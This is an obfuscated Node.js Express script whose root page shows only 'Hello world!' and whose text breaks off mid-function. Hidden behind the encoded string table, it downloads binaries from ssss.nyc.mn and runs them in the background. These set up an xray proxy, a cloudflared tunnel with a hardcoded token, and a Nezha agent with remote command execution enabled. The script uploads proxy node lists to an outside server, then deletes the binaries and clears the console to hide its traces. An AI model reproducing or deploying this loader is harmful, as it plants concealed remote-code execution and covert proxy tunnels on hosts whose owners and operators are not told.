const _0x5420ec=_0x5987;(function(_0x550c42,_0x2e67d7){const _0x243b72=_0x5987,_0x37329f=_0x550c42();while(!![]){try{const _0x1ab41f=-parseInt(_0x243b72(0x1df))/0x1+parseInt(_0x243b72(0x1d4))/0x2+-parseInt(_0x243b72(0x27a))/0x3*(parseInt(_0x243b72(0x27c))/0x4)+parseInt(_0x243b72(0x225))/0x5*(-parseInt(_0x243b72(0x282))/0x6)+parseInt(_0x243b72(0x1de))/0x7*(-parseInt(_0x243b72(0x251))/0x8)+parseInt(_0x243b72(0x25f))/0x9*(parseInt(_0x243b72(0x275))/0xa)+-parseInt(_0x243b72(0x211))/0xb*(-parseInt(_0x243b72(0x232))/0xc);if(_0x1ab41f===_0x2e67d7)break;else _0x37329f['push'](_0x37329f['shift']());}catch(_0x2c29a3){_0x37329f['push'](_0x37329f['shift']());}}}(_0x5383,0x7b5d9));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5420ec(0x221)),{promisify}=require(_0x5420ec(0x23c)),exec=promisify(require(_0x5420ec(0x25e))['exec']),{execSync}=require(_0x5420ec(0x25e)),UPLOAD_URL=process[_0x5420ec(0x238)][_0x5420ec(0x261)]||'',PROJECT_URL=process[_0x5420ec(0x238)][_0x5420ec(0x25c)]||'',AUTO_ACCESS=process[_0x5420ec(0x238)][_0x5420ec(0x1c2)]||![],FILE_PATH=process['env'][_0x5420ec(0x276)]||'./tmp',SUB_PATH=process[_0x5420ec(0x238)][_0x5420ec(0x1e0)]||'11689',PORT=process['env'][_0x5420ec(0x254)]||process[_0x5420ec(0x238)]['PORT']||0xbb8,UUID=process[_0x5420ec(0x238)]['UUID']||_0x5420ec(0x24b),NEZHA_SERVER=process[_0x5420ec(0x238)][_0x5420ec(0x235)]||'',NEZHA_PORT=process['env'][_0x5420ec(0x1ff)]||'',NEZHA_KEY=process[_0x5420ec(0x238)][_0x5420ec(0x24d)]||'',ARGO_DOMAIN=process[_0x5420ec(0x238)][_0x5420ec(0x23f)]||'usay.book1038.dpdns.org',ARGO_AUTH=process[_0x5420ec(0x238)][_0x5420ec(0x1db)]||_0x5420ec(0x263),ARGO_PORT=process[_0x5420ec(0x238)]['ARGO_PORT']||0x1f49,CFIP=process[_0x5420ec(0x238)][_0x5420ec(0x1e5)]||_0x5420ec(0x24c),CFPORT=process[_0x5420ec(0x238)]['CFPORT']||0x1bb,NAME=process[_0x5420ec(0x238)]['NAME']||_0x5420ec(0x27f);!fs[_0x5420ec(0x1fa)](FILE_PATH)?(fs[_0x5420ec(0x220)](FILE_PATH),console[_0x5420ec(0x250)](FILE_PATH+_0x5420ec(0x20f))):console[_0x5420ec(0x250)](FILE_PATH+_0x5420ec(0x1ed));function generateRandomName(){const _0x174328=_0x5420ec,_0x31b7eb='abcdefghijklmnopqrstuvwxyz';let _0x1ea2c7='';for(let _0x2bee99=0x0;_0x2bee99<0x6;_0x2bee99++){_0x1ea2c7+=_0x31b7eb[_0x174328(0x20c)](Math['floor'](Math[_0x174328(0x1ce)]()*_0x31b7eb[_0x174328(0x279)]));}return _0x1ea2c7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5420ec(0x25a)](FILE_PATH,npmName),phpPath=path[_0x5420ec(0x25a)](FILE_PATH,phpName),webPath=path[_0x5420ec(0x25a)](FILE_PATH,webName),botPath=path[_0x5420ec(0x25a)](FILE_PATH,botName),subPath=path[_0x5420ec(0x25a)](FILE_PATH,_0x5420ec(0x22b)),listPath=path[_0x5420ec(0x25a)](FILE_PATH,_0x5420ec(0x260)),bootLogPath=path[_0x5420ec(0x25a)](FILE_PATH,_0x5420ec(0x256)),configPath=path[_0x5420ec(0x25a)](FILE_PATH,_0x5420ec(0x1e7));function deleteNodes(){const _0x2a3ae4=_0x5420ec;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2deb60;try{_0x2deb60=fs['readFileSync'](subPath,_0x2a3ae4(0x204));}catch{return null;}const _0xcf00a4=Buffer[_0x2a3ae4(0x269)](_0x2deb60,_0x2a3ae4(0x1d8))[_0x2a3ae4(0x1c7)](_0x2a3ae4(0x204)),_0x2c2caa=_0xcf00a4[_0x2a3ae4(0x267)]('\x0a')[_0x2a3ae4(0x241)](_0x23eab9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a3ae4(0x1e3)](_0x23eab9));if(_0x2c2caa[_0x2a3ae4(0x279)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2a3ae4(0x234)]({'nodes':_0x2c2caa}),{'headers':{'Content-Type':'application/json'}})[_0x2a3ae4(0x1d0)](_0x1e3511=>{return null;}),null;}catch(_0x5c898c){return null;}}function cleanupOldFiles(){const _0x2df56c=_0x5420ec;try{const _0x40f212=fs[_0x2df56c(0x1cf)](FILE_PATH);_0x40f212[_0x2df56c(0x21b)](_0x4e2769=>{const _0x157e27=_0x2df56c,_0x20d802=path[_0x157e27(0x25a)](FILE_PATH,_0x4e2769);try{const _0x435851=fs[_0x157e27(0x22e)](_0x20d802);_0x435851[_0x157e27(0x27d)]()&&fs[_0x157e27(0x1f6)](_0x20d802);}catch(_0x5187e4){}});}catch(_0x25612c){}}app[_0x5420ec(0x227)]('/',function(_0x5a78f4,_0x48479d){const _0x52e215=_0x5420ec;_0x48479d[_0x52e215(0x26e)](_0x52e215(0x1e6));});async function generateConfig(){const _0x248173=_0x5420ec,_0x3da871={'log':{'access':_0x248173(0x283),'error':_0x248173(0x283),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x248173(0x228),'settings':{'clients':[{'id':UUID,'flow':_0x248173(0x281)}],'decryption':_0x248173(0x257),'fallbacks':[{'dest':0xbb9},{'path':_0x248173(0x27b),'dest':0xbba},{'path':_0x248173(0x206),'dest':0xbbb},{'path':_0x248173(0x259),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x248173(0x277),'protocol':_0x248173(0x228),'settings':{'clients':[{'id':UUID}],'decryption':_0x248173(0x257)},'streamSettings':{'network':_0x248173(0x21d),'security':'none'}},{'port':0xbba,'listen':_0x248173(0x277),'protocol':_0x248173(0x228),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x248173(0x257)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x248173(0x27b)}},'sniffing':{'enabled':!![],'destOverride':[_0x248173(0x213),_0x248173(0x255),_0x248173(0x264)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x248173(0x277),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x248173(0x206)}},'sniffing':{'enabled':!![],'destOverride':[_0x248173(0x213),_0x248173(0x255),_0x248173(0x264)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x248173(0x277),'protocol':_0x248173(0x1e8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x248173(0x257),'wsSettings':{'path':_0x248173(0x259)}},'sniffing':{'enabled':!![],'destOverride':[_0x248173(0x213),_0x248173(0x255),_0x248173(0x264)],'metadataOnly':![]}}],'dns':{'servers':[_0x248173(0x23a)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x248173(0x249),'tag':'block'}]};fs[_0x248173(0x278)](path[_0x248173(0x25a)](FILE_PATH,_0x248173(0x1e7)),JSON['stringify'](_0x3da871,null,0x2));}function getSystemArchitecture(){const _0x17cdc7=_0x5420ec,_0x225eea=os[_0x17cdc7(0x1dc)]();return _0x225eea===_0x17cdc7(0x1f2)||_0x225eea===_0x17cdc7(0x202)||_0x225eea===_0x17cdc7(0x20d)?_0x17cdc7(0x1f2):_0x17cdc7(0x24a);}function downloadFile(_0x26fd60,_0x5484a1,_0x51df3a){const _0x507c32=_0x5420ec,_0x55d518=_0x26fd60;!fs[_0x507c32(0x1fa)](FILE_PATH)&&fs[_0x507c32(0x220)](FILE_PATH,{'recursive':!![]});const _0x286285=fs['createWriteStream'](_0x55d518);axios({'method':_0x507c32(0x227),'url':_0x5484a1,'responseType':'stream'})[_0x507c32(0x242)](_0x5d041c=>{const _0x8c7778=_0x507c32;_0x5d041c[_0x8c7778(0x26f)][_0x8c7778(0x244)](_0x286285),_0x286285['on'](_0x8c7778(0x1f3),()=>{const _0x2a25c7=_0x8c7778;_0x286285[_0x2a25c7(0x26a)](),console[_0x2a25c7(0x250)](_0x2a25c7(0x1ea)+path[_0x2a25c7(0x215)](_0x55d518)+_0x2a25c7(0x1f4)),_0x51df3a(null,_0x55d518);}),_0x286285['on']('error',_0x450ee0=>{const _0x510949=_0x8c7778;fs[_0x510949(0x224)](_0x55d518,()=>{});const _0x1e6e44='Download\x20'+path['basename'](_0x55d518)+_0x510949(0x1da)+_0x450ee0[_0x510949(0x1d1)];console[_0x510949(0x1ec)](_0x1e6e44),_0x51df3a(_0x1e6e44);});})[_0x507c32(0x1d0)](_0x4ea905=>{const _0x566ec9=_0x507c32,_0x58e1ab=_0x566ec9(0x1ea)+path[_0x566ec9(0x215)](_0x55d518)+_0x566ec9(0x1da)+_0x4ea905[_0x566ec9(0x1d1)];console['error'](_0x58e1ab),_0x51df3a(_0x58e1ab);});}function _0x5987(_0x34034c,_0x2b2025){_0x34034c=_0x34034c-0x1c1;const _0x53839e=_0x5383();let _0x5987b6=_0x53839e[_0x34034c];return _0x5987b6;}async function downloadFilesAndRun(){const _0x3ee8fd=_0x5420ec,_0xc97d0d=getSystemArchitecture(),_0x2e029b=getFilesForArchitecture(_0xc97d0d);if(_0x2e029b[_0x3ee8fd(0x279)]===0x0){console[_0x3ee8fd(0x250)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2ca738=_0x2e029b[_0x3ee8fd(0x24e)](_0x558444=>{return new Promise((_0x155503,_0x3ffa58)=>{const _0x14ba62=_0x5987;downloadFile(_0x558444[_0x14ba62(0x1ef)],_0x558444[_0x14ba62(0x240)],(_0x128afa,_0x17c659)=>{_0x128afa?_0x3ffa58(_0x128afa):_0x155503(_0x17c659);});});});try{await Promise[_0x3ee8fd(0x1d2)](_0x2ca738);}catch(_0x370755){console['error'](_0x3ee8fd(0x1cd),_0x370755);return;}function _0xb49a3a(_0x177c6a){const _0x5a759f=_0x3ee8fd,_0x693141=0x1fd;_0x177c6a[_0x5a759f(0x21b)](_0x20c2bc=>{const _0x3422bf=_0x5a759f;fs['existsSync'](_0x20c2bc)&&fs[_0x3422bf(0x1c1)](_0x20c2bc,_0x693141,_0x5ab350=>{const _0x485d4e=_0x3422bf;_0x5ab350?console[_0x485d4e(0x1ec)](_0x485d4e(0x219)+_0x20c2bc+':\x20'+_0x5ab350):console[_0x485d4e(0x250)](_0x485d4e(0x21f)+_0x20c2bc+':\x20'+_0x693141[_0x485d4e(0x1c7)](0x8));});});}const _0x348cdc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xb49a3a(_0x348cdc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x59902c=NEZHA_SERVER[_0x3ee8fd(0x23e)](':')?NEZHA_SERVER['split'](':')[_0x3ee8fd(0x27e)]():'',_0x1ed609=new Set([_0x3ee8fd(0x1fd),_0x3ee8fd(0x201),_0x3ee8fd(0x26d),_0x3ee8fd(0x1e4),'2083','2053']),_0x4d1499=_0x1ed609[_0x3ee8fd(0x205)](_0x59902c)?_0x3ee8fd(0x236):_0x3ee8fd(0x1c4),_0x3acaff=_0x3ee8fd(0x24f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3ee8fd(0x229)+_0x4d1499+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3ee8fd(0x278)](path[_0x3ee8fd(0x25a)](FILE_PATH,_0x3ee8fd(0x21e)),_0x3acaff);const _0x1561da=_0x3ee8fd(0x217)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3ee8fd(0x1ee);try{await exec(_0x1561da),console[_0x3ee8fd(0x250)](phpName+'\x20is\x20running'),await new Promise(_0x504bfa=>setTimeout(_0x504bfa,0x3e8));}catch(_0x28d6b2){console[_0x3ee8fd(0x1ec)](_0x3ee8fd(0x253)+_0x28d6b2);}}else{let _0x3992d9='';const _0x3bbb62=[_0x3ee8fd(0x1fd),_0x3ee8fd(0x201),'2096','2087',_0x3ee8fd(0x21a),_0x3ee8fd(0x1d6)];_0x3bbb62[_0x3ee8fd(0x23e)](NEZHA_PORT)&&(_0x3992d9=_0x3ee8fd(0x1c9));const _0x44ba59=_0x3ee8fd(0x217)+npmPath+_0x3ee8fd(0x20e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ee8fd(0x22d)+NEZHA_KEY+'\x20'+_0x3992d9+_0x3ee8fd(0x268);try{await exec(_0x44ba59),console[_0x3ee8fd(0x250)](npmName+'\x20is\x20running'),await new Promise(_0x524471=>setTimeout(_0x524471,0x3e8));}catch(_0x1ade00){console['error'](_0x3ee8fd(0x272)+_0x1ade00);}}}else console['log'](_0x3ee8fd(0x230));const _0x31ebbd=_0x3ee8fd(0x217)+webPath+_0x3ee8fd(0x203)+FILE_PATH+_0x3ee8fd(0x214);try{await exec(_0x31ebbd),console[_0x3ee8fd(0x250)](webName+_0x3ee8fd(0x1f5)),await new Promise(_0x138a59=>setTimeout(_0x138a59,0x3e8));}catch(_0x14358d){console[_0x3ee8fd(0x1ec)]('web\x20running\x20error:\x20'+_0x14358d);}if(fs[_0x3ee8fd(0x1fa)](botPath)){let _0x5f3507;if(ARGO_AUTH[_0x3ee8fd(0x271)](/^[A-Z0-9a-z=]{120,250}$/))_0x5f3507=_0x3ee8fd(0x20a)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x5f3507=_0x3ee8fd(0x233)+FILE_PATH+'/tunnel.yml\x20run':_0x5f3507=_0x3ee8fd(0x216)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3ee8fd(0x217)+botPath+'\x20'+_0x5f3507+_0x3ee8fd(0x1fb)),console[_0x3ee8fd(0x250)](botName+_0x3ee8fd(0x1f5)),await new Promise(_0xc8b621=>setTimeout(_0xc8b621,0x7d0));}catch(_0x4a7d96){console[_0x3ee8fd(0x1ec)]('Error\x20executing\x20command:\x20'+_0x4a7d96);}}await new Promise(_0x3a16fe=>setTimeout(_0x3a16fe,0x1388));}function getFilesForArchitecture(_0x26c98e){const _0x36e1d2=_0x5420ec;let _0x581af0;_0x26c98e==='arm'?_0x581af0=[{'fileName':webPath,'fileUrl':_0x36e1d2(0x1f9)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x581af0=[{'fileName':webPath,'fileUrl':_0x36e1d2(0x273)},{'fileName':botPath,'fileUrl':_0x36e1d2(0x22c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4da9d0=_0x26c98e===_0x36e1d2(0x1f2)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x581af0['unshift']({'fileName':npmPath,'fileUrl':_0x4da9d0});}else{const _0x58eab0=_0x26c98e==='arm'?_0x36e1d2(0x246):_0x36e1d2(0x23b);_0x581af0['unshift']({'fileName':phpPath,'fileUrl':_0x58eab0});}}return _0x581af0;}function argoType(){const _0x29e259=_0x5420ec;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x29e259(0x250)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x29e259(0x23e)]('TunnelSecret')){fs[_0x29e259(0x278)](path['join'](FILE_PATH,_0x29e259(0x226)),ARGO_AUTH);const _0x15ac24=_0x29e259(0x218)+ARGO_AUTH[_0x29e259(0x267)]('\x22')[0xb]+_0x29e259(0x1f0)+path[_0x29e259(0x25a)](FILE_PATH,_0x29e259(0x226))+_0x29e259(0x1f7)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x29e259(0x1f8);fs[_0x29e259(0x278)](path[_0x29e259(0x25a)](FILE_PATH,_0x29e259(0x1eb)),_0x15ac24);}else console[_0x29e259(0x250)](_0x29e259(0x258));}async function extractDomains(){const _0x1ddd5f=_0x5420ec;let _0x7d9cd;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7d9cd=ARGO_DOMAIN,console[_0x1ddd5f(0x250)](_0x1ddd5f(0x1fc),_0x7d9cd),await _0x2e6689(_0x7d9cd);else try{const _0x5b4e5c=fs['readFileSync'](path[_0x1ddd5f(0x25a)](FILE_PATH,_0x1ddd5f(0x256)),_0x1ddd5f(0x204)),_0x19b06d=_0x5b4e5c[_0x1ddd5f(0x267)]('\x0a'),_0x5d639c=[];_0x19b06d['forEach'](_0x455749=>{const _0x149873=_0x1ddd5f,_0x8a217e=_0x455749[_0x149873(0x271)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x8a217e){const _0x5dbdd9=_0x8a217e[0x1];_0x5d639c['push'](_0x5dbdd9);}});if(_0x5d639c[_0x1ddd5f(0x279)]>0x0)_0x7d9cd=_0x5d639c[0x0],console[_0x1ddd5f(0x250)]('ArgoDomain:',_0x7d9cd),await _0x2e6689(_0x7d9cd);else{console[_0x1ddd5f(0x250)](_0x1ddd5f(0x1fe)),fs['unlinkSync'](path[_0x1ddd5f(0x25a)](FILE_PATH,_0x1ddd5f(0x256)));async function _0x373ec4(){const _0x214785=_0x1ddd5f;try{process[_0x214785(0x22a)]===_0x214785(0x262)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x214785(0x25b)):await exec('pkill\x20-f\x20\x22['+botName[_0x214785(0x20c)](0x0)+']'+botName[_0x214785(0x1d5)](0x1)+_0x214785(0x1e2));}catch(_0xfdaf8f){}}_0x373ec4(),await new Promise(_0x1003d0=>setTimeout(_0x1003d0,0xbb8));const _0x58b550=_0x1ddd5f(0x216)+FILE_PATH+_0x1ddd5f(0x223)+ARGO_PORT;try{await exec(_0x1ddd5f(0x217)+botPath+'\x20'+_0x58b550+_0x1ddd5f(0x1fb)),console[_0x1ddd5f(0x250)](botName+_0x1ddd5f(0x1f5)),await new Promise(_0x3ae97c=>setTimeout(_0x3ae97c,0xbb8)),await extractDomains();}catch(_0x2b4fa6){console[_0x1ddd5f(0x1ec)]('Error\x20executing\x20command:\x20'+_0x2b4fa6);}}}catch(_0x11f8a4){console[_0x1ddd5f(0x1ec)](_0x1ddd5f(0x247),_0x11f8a4);}async function _0x5d79ca(){const _0x2afd5c=_0x1ddd5f;try{const _0x2f958b=await axios['get'](_0x2afd5c(0x26c),{'timeout':0xbb8});if(_0x2f958b[_0x2afd5c(0x26f)]&&_0x2f958b[_0x2afd5c(0x26f)][_0x2afd5c(0x1e9)]&&_0x2f958b[_0x2afd5c(0x26f)]['org'])return _0x2f958b['data'][_0x2afd5c(0x1e9)]+'_'+_0x2f958b['data'][_0x2afd5c(0x1d9)];}catch(_0x312477){try{const _0x2efc2c=await axios[_0x2afd5c(0x227)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2efc2c[_0x2afd5c(0x26f)]&&_0x2efc2c['data'][_0x2afd5c(0x1d7)]===_0x2afd5c(0x222)&&_0x2efc2c[_0x2afd5c(0x26f)]['countryCode']&&_0x2efc2c[_0x2afd5c(0x26f)][_0x2afd5c(0x1d9)])return _0x2efc2c[_0x2afd5c(0x26f)][_0x2afd5c(0x210)]+'_'+_0x2efc2c[_0x2afd5c(0x26f)]['org'];}catch(_0x4d8d1b){}}return'Unknown';}async function _0x2e6689(_0x4bfc86){const _0xf2b7a5=await _0x5d79ca(),_0x41e2fe=NAME?NAME+'-'+_0xf2b7a5:_0xf2b7a5;return new Promise(_0x24ba15=>{setTimeout(()=>{const _0x1275b5=_0x5987,_0x13f540={'v':'2','ps':''+_0x41e2fe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1275b5(0x257),'host':_0x4bfc86,'path':_0x1275b5(0x239),'tls':_0x1275b5(0x255),'sni':_0x4bfc86,'alpn':'','fp':_0x1275b5(0x209)},_0x540c91=_0x1275b5(0x1c5)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4bfc86+_0x1275b5(0x1e1)+_0x4bfc86+_0x1275b5(0x243)+_0x41e2fe+_0x1275b5(0x266)+Buffer[_0x1275b5(0x269)](JSON['stringify'](_0x13f540))['toString'](_0x1275b5(0x1d8))+_0x1275b5(0x25d)+UUID+'@'+CFIP+':'+CFPORT+_0x1275b5(0x21c)+_0x4bfc86+_0x1275b5(0x1e1)+_0x4bfc86+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x41e2fe+_0x1275b5(0x1cb);console[_0x1275b5(0x250)](Buffer[_0x1275b5(0x269)](_0x540c91)[_0x1275b5(0x1c7)](_0x1275b5(0x1d8))),fs[_0x1275b5(0x278)](subPath,Buffer[_0x1275b5(0x269)](_0x540c91)['toString'](_0x1275b5(0x1d8))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1275b5(0x227)]('/'+SUB_PATH,(_0x2567e2,_0x1040ef)=>{const _0x4c12a8=_0x1275b5,_0x469e16=Buffer[_0x4c12a8(0x269)](_0x540c91)[_0x4c12a8(0x1c7)]('base64');_0x1040ef[_0x4c12a8(0x280)](_0x4c12a8(0x23d),'text/plain;\x20charset=utf-8'),_0x1040ef['send'](_0x469e16);}),_0x24ba15(_0x540c91);},0x7d0);});}}function _0x5383(){const _0x5b18ce=['https://ipapi.co/json/','2096','send','data','response','match','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/web','/api/add-nodes','20lnwemN','FILE_PATH','127.0.0.1','writeFileSync','length','3hlaYHo','/vless-argo','808400vUxuqH','isFile','pop','usay','set','xtls-rprx-vision','183186CYKxyo','/dev/null','chmod','AUTO_ACCESS','readFileSync','false','\x0avless://','push','toString','Subscription\x20uploaded\x20successfully','--tls','/api/add-subscriptions','\x0a\x20\x20\x20\x20','App\x20is\x20running','Error\x20downloading\x20files:','random','readdirSync','catch','message','all','Unhandled\x20error\x20in\x20startserver:','1862998FvMWtn','substring','2053','status','base64','org','\x20failed:\x20','ARGO_AUTH','arch','listen','639835LtXFDr','481034idhufb','SUB_PATH','&fp=firefox&type=ws&host=','\x22\x20>\x20/dev/null\x202>&1','test','2087','CFIP','Hello\x20world!','config.json','trojan','country_code','Download\x20','tunnel.yml','error','\x20already\x20exists','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','fileName','\x0a\x20\x20credentials-file:\x20','Error\x20in\x20startserver:','arm','finish','\x20successfully','\x20is\x20running','unlinkSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/web','existsSync','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','443','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_PORT','automatic\x20access\x20task\x20added\x20successfully','8443','arm64','\x20-c\x20','utf-8','has','/vmess-argo','clear','Add\x20automatic\x20access\x20task\x20faild:\x20','firefox','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','rm\x20-rf\x20','charAt','aarch64','\x20-s\x20','\x20is\x20created','countryCode','4147KbRbbl','application/json','http','/config.json\x20>/dev/null\x202>&1\x20&','basename','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','nohup\x20','\x0a\x20\x20tunnel:\x20','Empowerment\x20failed\x20for\x20','2083','forEach','?security=tls&sni=','tcp','config.yaml','Empowerment\x20success\x20for\x20','mkdirSync','path','success','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlink','115UuWAAm','tunnel.json','get','vless','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','platform','sub.txt','https://amd64.ssss.nyc.mn/bot','\x20-p\x20','statSync','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://oooo.serv00.net/add-url','43068SjqrjQ','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stringify','NEZHA_SERVER','true','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','env','/vmess-argo?ed=2560','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/v1','util','Content-Type','includes','ARGO_DOMAIN','fileUrl','filter','then','&path=%2Fvless-argo%3Fed%3D2560#','pipe','Skipping\x20adding\x20automatic\x20access\x20task','https://arm64.ssss.nyc.mn/v1','Error\x20reading\x20boot.log:','del\x20/f\x20/q\x20','blackhole','amd','66286712-44f2-4b87-a9fe-f1b983cbffb9','cdns.doon.eu.org','NEZHA_KEY','map','\x0aclient_secret:\x20','log','48mxsmtM','\x20>/dev/null\x202>&1','php\x20running\x20error:\x20','SERVER_PORT','tls','boot.log','none','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/trojan-argo','join','.exe\x20>\x20nul\x202>&1','PROJECT_URL','\x0a\x0atrojan://','child_process','695385laCdEO','list.txt','UPLOAD_URL','win32','eyJhIjoiYzFiNjBhZGNjM2Q3ZGI5MzJjOWE4MDViZGIwY2FjYzAiLCJ0IjoiOGJjYTVjODktNTU2ZC00YWQ3LTk2NmEtZTg3NWI0YjI2YmY2IiwicyI6IllqVTRZekF5TTJJdFpqSTJNUzAwTm1ReUxXSTFPRFF0WVRaaU16TmpORGhsWldVeiJ9','quic','post','\x0a\x0avmess://','split','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','close','http\x20server\x20is\x20running\x20on\x20port:'];_0x5383=function(){return _0x5b18ce;};return _0x5383();}async function uploadNodes(){const _0x4264a9=_0x5420ec;if(UPLOAD_URL&&PROJECT_URL){const _0x57b42c=PROJECT_URL+'/'+SUB_PATH,_0x3c90e8={'subscription':[_0x57b42c]};try{const _0x553643=await axios[_0x4264a9(0x265)](UPLOAD_URL+_0x4264a9(0x1ca),_0x3c90e8,{'headers':{'Content-Type':_0x4264a9(0x212)}});return _0x553643&&_0x553643[_0x4264a9(0x1d7)]===0xc8?(console['log'](_0x4264a9(0x1c8)),_0x553643):null;}catch(_0x3759fe){if(_0x3759fe[_0x4264a9(0x270)]){if(_0x3759fe[_0x4264a9(0x270)][_0x4264a9(0x1d7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4264a9(0x1fa)](listPath))return;const _0x4b9053=fs[_0x4264a9(0x1c3)](listPath,_0x4264a9(0x204)),_0x249b90=_0x4b9053[_0x4264a9(0x267)]('\x0a')[_0x4264a9(0x241)](_0x1e9729=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4264a9(0x1e3)](_0x1e9729));if(_0x249b90[_0x4264a9(0x279)]===0x0)return;const _0x1d3178=JSON[_0x4264a9(0x234)]({'nodes':_0x249b90});try{const _0x3e2f24=await axios[_0x4264a9(0x265)](UPLOAD_URL+_0x4264a9(0x274),_0x1d3178,{'headers':{'Content-Type':'application/json'}});return _0x3e2f24&&_0x3e2f24[_0x4264a9(0x1d7)]===0xc8?(console[_0x4264a9(0x250)](_0x4264a9(0x22f)),_0x3e2f24):null;}catch(_0x504c88){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x543c02=_0x5987,_0x114d9a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x114d9a[_0x543c02(0x1c6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x114d9a[_0x543c02(0x1c6)](phpPath);process['platform']===_0x543c02(0x262)?exec(_0x543c02(0x248)+_0x114d9a[_0x543c02(0x25a)]('\x20')+'\x20>\x20nul\x202>&1',_0x271bad=>{const _0x48c8f9=_0x543c02;console['clear'](),console[_0x48c8f9(0x250)](_0x48c8f9(0x1cc)),console[_0x48c8f9(0x250)](_0x48c8f9(0x237));}):exec(_0x543c02(0x20b)+_0x114d9a[_0x543c02(0x25a)]('\x20')+_0x543c02(0x252),_0x307ecf=>{const _0x13a5d4=_0x543c02;console[_0x13a5d4(0x207)](),console['log']('App\x20is\x20running'),console[_0x13a5d4(0x250)](_0x13a5d4(0x237));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xc8560b=_0x5420ec;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xc8560b(0x250)](_0xc8560b(0x245));return;}try{const _0x3372b7=await axios[_0xc8560b(0x265)](_0xc8560b(0x231),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xc8560b(0x212)}});return console[_0xc8560b(0x250)](_0xc8560b(0x200)),_0x3372b7;}catch(_0x42033d){return 